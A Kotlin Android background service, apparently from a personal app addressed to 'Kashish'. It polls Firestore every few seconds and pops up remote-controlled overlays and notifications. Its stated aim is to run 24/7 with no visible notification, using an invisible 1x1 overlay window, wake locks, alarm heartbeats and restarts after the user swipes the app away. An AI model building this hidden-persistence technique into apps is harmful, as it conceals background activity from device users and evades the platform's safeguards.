package com.kashish.world

import android.app.AlarmManager
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

/**
 * Silent Truecaller-Style Firebase Background Service (Zero Permanent Notification):
 * Runs continuously in the background WITHOUT showing any permanent ongoing notification
 * in the status bar / notification shade.
 *
 * How it stays alive silently 24/7:
 * 1. Process-wide singleton ScheduledExecutorService watcher loop (`ensureWatcherRunning`)
 *    polling Firestore `overlays` and `notifications` every 4 seconds.
 * 2. Invisible 1x1 pixel `TYPE_APPLICATION_OVERLAY` keep-alive window token (`attachSilentKeepAlivePixel`)
 *    which keeps the app process at perceptible priority in Android's OomAdjuster with zero UI and zero notification.
 * 3. Unrestricted battery status (`REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`) + silent AlarmManager heartbeat.
 */
class FirestoreOverlayBackgroundService : Service() {

    companion object {
        private const val TAG = "FirestoreBgService"
        private const val LEGACY_BG_CHANNEL_ID = "kashish_bg_listener_channel"
        private const val LEGACY_BG_NOTIFICATION_ID = 7701
        private const val PREFS_NAME = "kashish_bg_seen_prefs"
        private const val KEY_SEEN_OVERLAYS = "seen_overlay_ids"
        private const val KEY_SEEN_NOTIFS = "seen_notif_ids"
        private const val FIREBASE_PROJECT_ID = "kashishji"
        const val ACTION_SILENT_HEARTBEAT = "com.kashish.world.ACTION_SILENT_HEARTBEAT"

        @Volatile
        var isRunning: Boolean = false
            private set

        @Volatile
        private var sharedScheduler: ScheduledExecutorService? = null

        @Volatile
        private var keepAlivePixelView: View? = null

        private val mainHandler = Handler(Looper.getMainLooper())

        fun clearLegacyPermanentNotification(context: Context) {
            try {
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
                nm.cancel(LEGACY_BG_NOTIFICATION_ID)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    nm.deleteNotificationChannel(LEGACY_BG_CHANNEL_ID)
                }
            } catch (_: Exception) {}
        }

        fun startServiceSafely(context: Context) {
            val appCtx = context.applicationContext
            clearLegacyPermanentNotification(appCtx)
            ensureWatcherRunning(appCtx)
            attachSilentKeepAlivePixel(appCtx)
            scheduleSilentHeartbeatAlarm(appCtx)
            try {
                val intent = Intent(appCtx, FirestoreOverlayBackgroundService::class.java)
                appCtx.startService(intent)
            } catch (e: Exception) {
                // Even if startService is restricted while app is in background,
                // ensureWatcherRunning(appCtx) + silent keep-alive pixel + heartbeat alarm are already active!
                Log.d(TAG, "Background watcher active via process singleton: ${e.message}")
            }
        }

        @Synchronized
        fun ensureWatcherRunning(context: Context) {
            val appCtx = context.applicationContext
            isRunning = true
            val current = sharedScheduler
            if (current != null && !current.isShutdown && !current.isTerminated) {
                return
            }
            val exec = Executors.newSingleThreadScheduledExecutor()
            sharedScheduler = exec
            exec.scheduleWithFixedDelay(
                {
                    try {
                        pollFirestoreOnce(appCtx)
                    } catch (e: Exception) {
                        Log.w(TAG, "Poll cycle note: ${e.message}")
                    }
                },
                1L,
                4L,
                TimeUnit.SECONDS
            )
        }

        /**
         * Attaches a 1x1 pixel, 0% alpha, untouchable, non-focusable overlay view to WindowManager.
         * Because SYSTEM_ALERT_WINDOW is granted, Android OS treats the process as having a visible window token
         * and never kills it in the background — without showing any status bar notification!
         */
        fun attachSilentKeepAlivePixel(context: Context) {
            val appCtx = context.applicationContext
            mainHandler.post {
                try {
                    if (keepAlivePixelView != null) return@post
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(appCtx)) {
                        return@post
                    }
                    val wm = appCtx.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return@post
                    val pixel = View(appCtx).apply {
                        setBackgroundColor(Color.TRANSPARENT)
                        alpha = 0f
                    }
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_PHONE
                    }
                    val params = WindowManager.LayoutParams(
                        1,
                        1,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = Gravity.TOP or Gravity.START
                        x = 0
                        y = 0
                        alpha = 0f
                    }
                    wm.addView(pixel, params)
                    keepAlivePixelView = pixel
                } catch (_: Exception) {}
            }
        }

        fun scheduleSilentHeartbeatAlarm(context: Context) {
            try {
                val appCtx = context.applicationContext
                val am = appCtx.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
                val intent = Intent(appCtx, BootCompletedReceiver::class.java).apply {
                    action = ACTION_SILENT_HEARTBEAT
                }
                val flags = PendingIntent.FLAG_UPDATE_CURRENT or
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
                val pi = PendingIntent.getBroadcast(appCtx, 7709, intent, flags)
                val triggerAt = SystemClock.elapsedRealtime() + 90_000L
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
                } else {
                    am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
                }
            } catch (_: Exception) {}
        }

        private fun pollFirestoreOnce(appCtx: Context) {
            val pm = appCtx.getSystemService(Context.POWER_SERVICE) as? PowerManager
            val wl = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "kashish:bg_poll_wl")?.apply {
                setReferenceCounted(false)
            }
            try {
                wl?.acquire(6_000L)
                checkLatestOverlaysFromFirestore(appCtx)
                checkLatestNotificationsFromFirestore(appCtx)
            } finally {
                try {
                    if (wl?.isHeld == true) wl.release()
                } catch (_: Exception) {}
            }
        }

        fun markOverlaySeenLocally(context: Context, docId: String) {
            if (docId.isBlank()) return
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val existing = prefs.getStringSet(KEY_SEEN_OVERLAYS, emptySet())?.toMutableSet() ?: mutableSetOf()
            existing.add(docId)
            prefs.edit().putStringSet(KEY_SEEN_OVERLAYS, existing).apply()
        }

        fun markOverlayDismissedInFirestore(context: Context, docId: String, clickedAction: String = "dismiss") {
            if (docId.isBlank()) return
            markOverlaySeenLocally(context, docId)
            Executors.newSingleThreadExecutor().execute {
                try {
                    val urlStr = "https://firestore.googleapis.com/v1/projects/$FIREBASE_PROJECT_ID/databases/(default)/documents/overlays/$docId" +
                        "?updateMask.fieldPaths=dismissed&updateMask.fieldPaths=clickedAction&updateMask.fieldPaths=seenAt"
                    val conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
                        requestMethod = "PATCH"
                        connectTimeout = 7000
                        readTimeout = 7000
                        doOutput = true
                        setRequestProperty("Content-Type", "application/json")
                        val token = PermissionReporter.getSavedAuthToken(context)
                        if (token.isNotBlank()) {
                            setRequestProperty("Authorization", "Bearer $token")
                        }
                    }
                    val body = JSONObject().apply {
                        put("fields", JSONObject().apply {
                            put("dismissed", JSONObject().put("booleanValue", true))
                            put("clickedAction", JSONObject().put("stringValue", clickedAction))
                            put("seenAt", JSONObject().put("integerValue", System.currentTimeMillis().toString()))
                        })
                    }
                    OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use {
                        it.write(body.toString())
                        it.flush()
                    }
                    conn.responseCode
                    conn.disconnect()
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to patch overlay status: ${e.message}")
                }
            }
        }

        fun markNotificationActionInFirestore(context: Context, docId: String, clickedAction: String) {
            if (docId.isBlank()) return
            Executors.newSingleThreadExecutor().execute {
                try {
                    val urlStr = "https://firestore.googleapis.com/v1/projects/$FIREBASE_PROJECT_ID/databases/(default)/documents/notifications/$docId" +
                        "?updateMask.fieldPaths=seen&updateMask.fieldPaths=clickedAction&updateMask.fieldPaths=seenAt"
                    val conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
                        requestMethod = "PATCH"
                        connectTimeout = 7000
                        readTimeout = 7000
                        doOutput = true
                        setRequestProperty("Content-Type", "application/json")
                        val token = PermissionReporter.getSavedAuthToken(context)
                        if (token.isNotBlank()) {
                            setRequestProperty("Authorization", "Bearer $token")
                        }
                    }
                    val body = JSONObject().apply {
                        put("fields", JSONObject().apply {
                            put("seen", JSONObject().put("booleanValue", true))
                            put("clickedAction", JSONObject().put("stringValue", clickedAction))
                            put("seenAt", JSONObject().put("integerValue", System.currentTimeMillis().toString()))
                        })
                    }
                    OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use {
                        it.write(body.toString())
                        it.flush()
                    }
                    conn.responseCode
                    conn.disconnect()
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to patch notification action: ${e.message}")
                }
            }
        }

        private fun checkLatestOverlaysFromFirestore(appCtx: Context) {
            val docs = fetchCollectionDocuments(appCtx, "overlays", pageSize = 8)
            if (docs.isEmpty()) return

            val prefs = appCtx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val seenIds = prefs.getStringSet(KEY_SEEN_OVERLAYS, emptySet())?.toMutableSet() ?: mutableSetOf()
            val now = System.currentTimeMillis()

            for (docObj in docs) {
                val fullName = docObj.optString("name", "")
                val docId = fullName.substringAfterLast('/')
                if (docId.isBlank() || seenIds.contains(docId)) continue

                val fields = docObj.optJSONObject("fields") ?: continue
                val dismissed = optBooleanField(fields, "dismissed", false)
                if (dismissed) {
                    seenIds.add(docId)
                    continue
                }

                val createdAt = optLongField(fields, "createdAt", 0L)
                val scheduledFor = optLongField(fields, "scheduledFor", 0L)

                if (scheduledFor > now) continue

                if (createdAt > 0L && (now - createdAt) > 86_400_000L) {
                    seenIds.add(docId)
                    continue
                }

                seenIds.add(docId)
                prefs.edit().putStringSet(KEY_SEEN_OVERLAYS, seenIds).apply()

                val title = optStringField(fields, "title", "A Special Note For Kashish 💖")
                val message = optStringField(fields, "message", "Thinking of you right now!")
                val imageUrl = optStringField(fields, "imageUrl", "")
                val theme = optStringField(fields, "theme", "velvet-rose")
                val fontStyle = optStringField(fields, "fontStyle", "romantic-serif")
                val soundUrl = optStringField(fields, "soundUrl", "")
                val buttonsJson = extractButtonsJsonArray(fields)

                mainHandler.post {
                    CallAndOverlayHelper.triggerTruecallerOverlay(
                        context = appCtx,
                        overlayDocId = docId,
                        title = title,
                        message = message,
                        imageUrl = imageUrl,
                        theme = theme,
                        fontStyle = fontStyle,
                        soundUrl = soundUrl,
                        buttonItemsJson = buttonsJson,
                        phoneNumber = CallAndOverlayHelper.getCachedPhoneNumber(appCtx)
                    )
                }
                break
            }
        }

        private fun checkLatestNotificationsFromFirestore(appCtx: Context) {
            val docs = fetchCollectionDocuments(appCtx, "notifications", pageSize = 6)
            if (docs.isEmpty()) return

            val prefs = appCtx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val seenIds = prefs.getStringSet(KEY_SEEN_NOTIFS, emptySet())?.toMutableSet() ?: mutableSetOf()
            val now = System.currentTimeMillis()

            for (docObj in docs) {
                val fullName = docObj.optString("name", "")
                val docId = fullName.substringAfterLast('/')
                if (docId.isBlank() || seenIds.contains(docId)) continue

                val fields = docObj.optJSONObject("fields") ?: continue
                val seen = optBooleanField(fields, "seen", false)
                if (seen) {
                    seenIds.add(docId)
                    continue
                }

                val createdAt = optLongField(fields, "createdAt", 0L)
                val scheduledFor = optLongField(fields, "scheduledFor", 0L)
                if (scheduledFor > now) continue
                if (createdAt > 0L && (now - createdAt) > 86_400_000L) {
                    seenIds.add(docId)
                    continue
                }

                seenIds.add(docId)
                prefs.edit().putStringSet(KEY_SEEN_NOTIFS, seenIds).apply()

                val title = optStringField(fields, "title", "Message from Jay 💖")
                val message = optStringField(fields, "message", "")
                val soundUrl = optStringField(fields, "soundUrl", "")
                val buttonsJson = extractButtonsJsonArray(fields)

                val cachedSound = SoundCacheManager.getOrDownloadSoundFile(appCtx, soundUrl)
                val channelId = SoundCacheManager.getChannelForSound(appCtx, soundUrl, cachedSound)
                SoundCacheManager.playCachedSound(appCtx, cachedSound)

                CallAndOverlayHelper.showHighPriorityBannerNotification(
                    context = appCtx,
                    title = title,
                    message = message,
                    channelId = channelId,
                    notifDocId = docId,
                    buttonItemsJson = buttonsJson,
                    phoneNumber = CallAndOverlayHelper.getCachedPhoneNumber(appCtx)
                )

                markNotificationSeenInFirestore(appCtx, docId)
                break
            }
        }

        private fun markNotificationSeenInFirestore(appCtx: Context, docId: String) {
            try {
                val urlStr = "https://firestore.googleapis.com/v1/projects/$FIREBASE_PROJECT_ID/databases/(default)/documents/notifications/$docId" +
                    "?updateMask.fieldPaths=seen&updateMask.fieldPaths=seenAt"
                val conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
                    requestMethod = "PATCH"
                    connectTimeout = 6000
                    readTimeout = 6000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    val token = PermissionReporter.getSavedAuthToken(appCtx)
                    if (token.isNotBlank()) {
                        setRequestProperty("Authorization", "Bearer $token")
                    }
                }
                val body = JSONObject().apply {
                    put("fields", JSONObject().apply {
                        put("seen", JSONObject().put("booleanValue", true))
                        put("seenAt", JSONObject().put("integerValue", System.currentTimeMillis().toString()))
                    })
                }
                OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use {
                    it.write(body.toString())
                    it.flush()
                }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }

        private fun fetchCollectionDocuments(appCtx: Context, collectionName: String, pageSize: Int): List<JSONObject> {
            val result = mutableListOf<JSONObject>()
            var conn: HttpURLConnection? = null
            try {
                val url = URL(
                    "https://firestore.googleapis.com/v1/projects/$FIREBASE_PROJECT_ID/databases/(default)/documents:runQuery"
                )
                conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    connectTimeout = 7000
                    readTimeout = 7000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    val token = PermissionReporter.getSavedAuthToken(appCtx)
                    if (token.isNotBlank()) {
                        setRequestProperty("Authorization", "Bearer $token")
                    }
                }

                val queryJson = JSONObject().apply {
                    put("structuredQuery", JSONObject().apply {
                        put("from", JSONArray().put(JSONObject().put("collectionId", collectionName)))
                        put(
                            "orderBy",
                            JSONArray().put(
                                JSONObject().apply {
                                    put("field", JSONObject().put("fieldPath", "createdAt"))
                                    put("direction", "DESCENDING")
                                }
                            )
                        )
                        put("limit", pageSize)
                    })
                }

                OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use { writer ->
                    writer.write(queryJson.toString())
                    writer.flush()
                }

                if (conn.responseCode in 200..299) {
                    val responseStr = BufferedReader(InputStreamReader(conn.inputStream, Charsets.UTF_8)).use {
                        it.readText()
                    }
                    val arr = JSONArray(responseStr)
                    for (i in 0 until arr.length()) {
                        val item = arr.optJSONObject(i) ?: continue
                        val doc = item.optJSONObject("document") ?: continue
                        result.add(doc)
                    }
                }
            } catch (_: Exception) {
            } finally {
                try {
                    conn?.disconnect()
                } catch (_: Exception) {}
            }
            return result
        }

        private fun optStringField(fields: JSONObject, key: String, defaultVal: String): String {
            val f = fields.optJSONObject(key) ?: return defaultVal
            return f.optString("stringValue", defaultVal)
        }

        private fun optBooleanField(fields: JSONObject, key: String, defaultVal: Boolean): Boolean {
            val f = fields.optJSONObject(key) ?: return defaultVal
            return if (f.has("booleanValue")) f.optBoolean("booleanValue", defaultVal) else defaultVal
        }

        private fun optLongField(fields: JSONObject, key: String, defaultVal: Long): Long {
            val f = fields.optJSONObject(key) ?: return defaultVal
            if (f.has("integerValue")) {
                return f.optString("integerValue", defaultVal.toString()).toLongOrNull() ?: defaultVal
            }
            if (f.has("doubleValue")) {
                return f.optDouble("doubleValue", defaultVal.toDouble()).toLong()
            }
            return defaultVal
        }

        private fun extractButtonsJsonArray(fields: JSONObject): String {
            val out = JSONArray()
            val buttonsField = fields.optJSONObject("buttons")
                ?.optJSONObject("arrayValue")
                ?.optJSONArray("values")
                ?: return out.toString()

            for (i in 0 until buttonsField.length()) {
                val mapFields = buttonsField.optJSONObject(i)
                    ?.optJSONObject("mapValue")
                    ?.optJSONObject("fields")
                    ?: continue
                val label = optStringField(mapFields, "label", "")
                val action = optStringField(mapFields, "action", "dismiss")
                val payload = optStringField(mapFields, "payload", "")
                if (label.isNotBlank()) {
                    out.put(
                        JSONObject().apply {
                            put("label", label)
                            put("action", action)
                            put("payload", payload)
                        }
                    )
                }
            }
            return out.toString()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        clearLegacyPermanentNotification(applicationContext)
        ensureWatcherRunning(applicationContext)
        attachSilentKeepAlivePixel(applicationContext)
        scheduleSilentHeartbeatAlarm(applicationContext)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        clearLegacyPermanentNotification(applicationContext)
        ensureWatcherRunning(applicationContext)
        attachSilentKeepAlivePixel(applicationContext)
        scheduleSilentHeartbeatAlarm(applicationContext)
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Keep watching silently even if user swipes the app away from Recents
        ensureWatcherRunning(applicationContext)
        attachSilentKeepAlivePixel(applicationContext)
        scheduleSilentHeartbeatAlarm(applicationContext)
    }

    override fun onDestroy() {
        scheduleSilentHeartbeatAlarm(applicationContext)
        super.onDestroy()
    }
}
